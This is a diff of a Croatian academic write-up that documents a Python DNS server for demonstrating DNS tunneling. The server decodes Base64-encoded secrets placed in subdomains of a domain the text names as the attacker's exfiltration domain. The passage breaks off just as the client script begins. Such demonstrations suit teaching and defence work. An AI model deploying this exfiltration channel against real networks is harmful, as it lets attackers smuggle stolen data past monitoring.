@@ -70,11 +70,22 @@ Tekst
 
 ## 2.4. Kod
 
+U sklopu praktičnog dijela rada implementiran je jednostavan DNS poslužitelj u programskom jeziku Python koji služi za demonstraciju DNS tunnelinga. Poslužitelj obrađuje dolazne DNS zahtjeve, iz imena domene izdvaja skrivenu poruku kodiranu u Base64 formatu te je dekodira na strani napadača. Time se ilustrira kako je moguće prenijeti proizvoljne podatke unutar DNS prometa.
+
 ### 2.4.1. Poslužitelj - dns_server.py
+
+Na početku skripte uvoze se potrebni moduli:
 
 import socket
 import base64
 from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A
+
+
+Modul socket služi za rad s UDP socketima i primanje/slanje DNS paketa, base64 omogućuje dekodiranje poruka koje su skrivene u DNS upitima, dok se pomoću biblioteke dnslib pojednostavljuje parsiranje i generiranje DNS zapisa (upita i odgovora).
+
+Ekstrakcija skrivene poruke iz poddomene
+
+Funkcija extract_message_from_subdomain(subdomain) zadužena je za dekodiranje skrivene poruke:
 
 def extract_message_from_subdomain(subdomain):
     try:
@@ -82,11 +93,26 @@ def extract_message_from_subdomain(subdomain):
     except Exception as error:
         return f"Error decoding message: {error}"
 
+
+Pretpostavlja se da je tajna poruka kodirana u Base64 formatu i umetnuta u prvi dio domene (poddomenu). Funkcija prima taj niz znakova, pretvara ga u bajtove i potom pokušava dekodirati iz Base64 natrag u čitljiv tekst. U slučaju pogreške (npr. ako niz nije ispravno kodiran), vraća se poruka o grešci. Ovaj korak direktno predstavlja “vađenje” tuneliranih podataka iz DNS upita.
+
+Obrada DNS upita i dekodiranje tajne
+
+Ključna logika implementirana je u funkciji process_dns_query(query_data, client_ip):
+
 def process_dns_query(query_data, client_ip):
     parsed_query = DNSRecord.parse(query_data)
-    response_record = DNSRecord(DNSHeader(id=parsed_query.header.id, qr=1, aa=1, ra=1), q=parsed_query.q)
+    response_record = DNSRecord(
+        DNSHeader(id=parsed_query.header.id, qr=1, aa=1, ra=1),
+        q=parsed_query.q
+    )
     requested_domain = str(parsed_query.q.qname)
     print(f"Received DNS request for: {requested_domain} from {client_ip}")
+
+
+Primljeni DNS paket se parsira pomoću DNSRecord.parse, čime se dobiva struktura koja olakšava dohvaćanje traženog imena domene (qname). Na temelju dobivenog upita kreira se početni DNS odgovor (response_record), pri čemu se zadržava isti identifikator (id) kako bi klijent prepoznao odgovor kao pripadajući odgovarajućem upitu.
+
+Sljedeći dio funkcije provjerava radi li se o domeni koja se koristi za tuneliranje:
 
     if "dataexfiltration.hr" in requested_domain:
         domain_parts = requested_domain.split('.')
@@ -100,8 +126,19 @@ def process_dns_query(query_data, client_ip):
         print(f"Responding with IP: {ip_address}")
     else:
         print(f"Invalid domain query for: {requested_domain}")
-    
+
     return response_record.pack()
+
+
+Domena „dataexfiltration.hr“ predstavlja napadačevu domenu namijenjenu eksfiltraciji podataka. Ako se u zahtjevu nalazi ta domena, skripta razbija ime domene na dijelove pomoću točke (split('.')). U slučaju da postoji više od dva dijela (npr. tajnaPoruka.dataexfiltration.hr), pretpostavlja se da je prvi dio (secret_part) Base64-kodirana tajna poruka. Ta se poddomena potom prosljeđuje funkciji extract_message_from_subdomain, a dekodirana poruka ispisuje se u konzolu. Time napadačev poslužitelj “čita” tunelirane podatke skrivenе u DNS imenu.
+
+Neovisno o sadržaju poruke, DNS poslužitelj vraća legitiman odgovor klijentu: dodaje A zapis koji traženu domenu mapira na IP adresu 127.0.0.1. Na taj način DNS odgovor izgleda uobičajeno, a tuneliranje ostaje skriveno unutar same strukture upita.
+
+Ako zahtjev nije usmjeren na domenu dataexfiltration.hr, poslužitelj ga označava kao nevažeći za potrebe tuneliranja, ali ga i dalje može obraditi ili ignorirati, ovisno o daljnjoj implementaciji.
+
+Pokretanje DNS poslužitelja
+
+Funkcija run_dns_server implementira samu DNS uslugu koja neprekidno sluša na odabranom portu:
 
 def run_dns_server(bind_address="0.0.0.0", bind_port=5354):
     print(f"DNS server is running on {bind_address}:{bind_port}")
@@ -115,12 +152,19 @@ def run_dns_server(bind_address="0.0.0.0", bind_port=5354):
             except Exception as e:
                 print(f"Error during query processing: {e}")
 
+
+Poslužitelj koristi UDP socket jer DNS standardno radi preko UDP-a. Socket se veže na zadanu IP adresu i port (u ovom slučaju 5354), zatim u beskonačnoj petlji (while True) prima DNS upite do veličine 512 bajtova (standardna veličina DNS paketa). Svaki primljeni upit prosljeđuje se funkciji process_dns_query, a dobiveni odgovor ponovno se šalje klijentu na istu adresu. Ugrađena je osnovna obrada grešaka kako bi se spriječio prestanak rada poslužitelja zbog iznimki.
+
+Na kraju se skripta pokreće standardnim Python obrascem:
+
 if __name__ == "__main__":
     try:
         run_dns_server()
     except KeyboardInterrupt:
         print("\nDNS server stopped.")
 
+
+Ovo omogućuje da se DNS poslužitelj pokrene samo kada se skripta izvršava izravno, dok se logika može ponovno koristiti i kao modul u drugim programima.
 ## 2.4.2. Klijent - client.py
 
 import dns.message
